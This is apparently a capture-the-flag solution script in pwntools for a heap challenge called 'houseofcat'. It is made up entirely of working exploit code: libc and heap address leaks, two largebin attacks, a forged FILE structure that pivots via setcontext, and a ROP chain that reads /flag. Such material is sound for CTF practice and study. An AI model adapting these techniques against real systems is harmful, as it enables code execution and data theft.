from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./houseofcat')

#context.log_level = 'debug'
debug = 1

if debug:
    io = process('./houseofcat')
else:
    io = remote('')

def p():
    gdb.attach(proc.pidof(io)[0])

#one_gadget = [,,]

token = b"CAT |".ljust(17,b'\x41') + b" r00tQWB" + b"QWXF"
token = token.ljust(0x1e,b'\x61')
token += b'\xff' * 8 + b"$\x00"

def new(idx,size,content = b'\n'):
    io.sendafter(b"mew mew mew~~~~~~\n",token)
    io.sendlineafter(b"plz input your cat choice:\n",str(1).encode())
    io.sendlineafter(b"plz input your cat idx:\n",str(idx).encode())
    size = int(hex(size),16)
    io.sendlineafter(b"plz input your cat size:\n",str(size).encode())
    io.sendafter(b"plz input your content:\n",content)

def delete(idx):
    io.sendafter(b"mew mew mew~~~~~~\n",token)
    io.sendlineafter(b"plz input your cat choice:\n",str(2).encode())
    io.sendlineafter(b"plz input your cat idx:\n",str(idx).encode())

def show(idx):
    io.sendafter(b"mew mew mew~~~~~~\n",token)
    io.sendlineafter(b"plz input your cat choice:\n",str(3).encode())
    io.sendlineafter(b"plz input your cat idx:\n",str(idx).encode())

def edit(idx,content):
    io.sendafter(b"mew mew mew~~~~~~\n",token)
    io.sendlineafter(b"plz input your cat choice:\n",str(4).encode())
    io.sendlineafter(b"plz input your cat idx:\n",str(idx).encode())
    io.sendafter(b"plz input your content:\n",content)

login = b"LOGIN |".ljust(17,b'\x41') + b" r00tQWB" + b"QWXF"
login = login.ljust(0x1e,b'\x61')
login += b"admin\x00"
io.sendafter(b"mew mew mew~~~~~~\n",login)

new(0,0x428) # p1
new(1,0x438,b'/flag\x00\x00\x00') # padding
new(2,0x418) # p2
new(3,0x418) # p3
delete(0)
delete(2)
show(0)
io.recvuntil(b"Context:\n")
libc_base = u64(io.recv(6) + b'\x00\x00') - 0x219ce0
success("libc_base --> " + hex(libc_base))
show(2)
io.recvuntil(b"Context:\n")
heap_base = u64(io.recv(6) + b'\x00\x00') - 0x290
success("heap_base --> " + hex(heap_base))

# fake FILE
## parpare value
_IO_wfile_overflow_addr = libc_base + 0x215f58
lock = libc_base + 0x21ba80
fake_wide_date_addr = heap_base + 0xb10 
fake_vtable_addr = heap_base + 0xb10 + 0xe0 + 0x10
setcontext = libc_base +0x53a6d

# 含0x10header
fake_io_file= p64(0) * 15 + p64(lock) + p64(0) * 2 + p64(fake_wide_date_addr) + p64(0) * 3 + p64(1) + p64(0) * 2 + p64(_IO_wfile_overflow_addr - 0x18) 

fake_file = FileStructure()
fake_file.flags = 0
#fake_file._mode = 1
fake_file._lock = lock
fake_file._wide_data = fake_wide_date_addr
fake_file.vtable = _IO_wfile_overflow_addr - 0x18
print(fake_file)

new(5,0x428,fake_io_file) # p1
new(4,0x418) # p2
delete(5)
new(6,0x438)
delete(4)
#p()

# orw
## open(flag_strings_addr,0)
## read(3, flag_addr , len)
## write(1, flag_addr , len)
## puts(flag_addr)
ret_addr = libc_base + 0x0000000000029cd6 # ret
orw_addr = heap_base + 0x1780 + 0x10
flag_addr = heap_base + 0x6e0
flag_strings_addr = heap_base + 0x6d0
pop_rdi_ret =  libc_base + 0x000000000002a3e5 # pop rdi ; ret
pop_rsi_ret = libc_base + 0x000000000002be51 # pop rsi ; ret
pop_rdx_r12_ret = libc_base + 0x000000000011f497 # pop rdx ; pop r12 ; ret
pop_rax_ret = libc_base + 0x0000000000045eb0 # pop rax ; ret
open_addr = libc_base + 0x114690
read_addr = libc_base + 0x114980
puts_addr = libc_base + libc.symbols['puts']
write_addr = libc_base + libc.symbols['write']
close_addr = libc_base + libc.symbols['close']
syscall_ret=libc_base+libc.search(asm('syscall\nret')).__next__()
success('syscall_ret-->'+hex(syscall_ret))
orw_chain = flat(
        pop_rdi_ret, 0,close_addr,
        pop_rdi_ret , flag_strings_addr , pop_rsi_ret , 0 , pop_rax_ret,2,syscall_ret,
        pop_rdi_ret , 0 , pop_rsi_ret , flag_addr , pop_rdx_r12_ret , 0x100 , 0,read_addr ,
        pop_rdi_ret ,1 , pop_rsi_ret, flag_addr ,pop_rdx_r12_ret, 0x100,0,write_addr )


# largebin attack
_IO_list_all_addr = libc_base + 0x21a680
stderr_addr = libc_base + 0x21a860
success("stderr_addr --> " + hex(stderr_addr))
largebin_attack_payload = p64(libc_base + 0x21a0d0) * 2
largebin_attack_payload += p64(heap_base + 0x290)
largebin_attack_payload += p64(stderr_addr - 0x20)
edit(0,largebin_attack_payload)
#p()
new(7,0x438)
new(8,0x438)
#p()


# fake wide_data struct
fun_addr = fake_wide_date_addr + 0xe0 + 0x10 + 0x8
fake_vtable_addr = fun_addr - 0x68
rsp = orw_addr
rip = ret_addr

fake_wide_date = b'\x00' * 0xa0 + p64(rsp) + p64(rip)
fake_wide_date = fake_wide_date.ljust(0xe0,b'\x00')
fake_wide_date += p64(fun_addr -0x68) +p64(0) * 2 +  p64(setcontext)
new(9,0x418,fake_wide_date) # p2取出来，第二次largebin attack
#p()

# largebin attack edit top
delete(3)

largebin_attack_payload = p64(libc_base + 0x21a0d0) * 2
largebin_attack_payload += p64(heap_base + 0x290)
largebin_attack_payload += p64(heap_base + 0x2008 - 0x20 - 5)
edit(0,largebin_attack_payload)
delete(7)
new(10,0x438,orw_chain)
p()
#new(11,0x440)
io.sendafter(b"mew mew mew~~~~~~\n",token)
io.sendlineafter(b"plz input your cat choice:\n",str(1).encode())
io.sendlineafter(b"plz input your cat idx:\n",str(11).encode())
size = int(hex(0x440),16)
io.sendlineafter(b"plz input your cat size:\n",str(size).encode())
 
#p()

io.interactive()

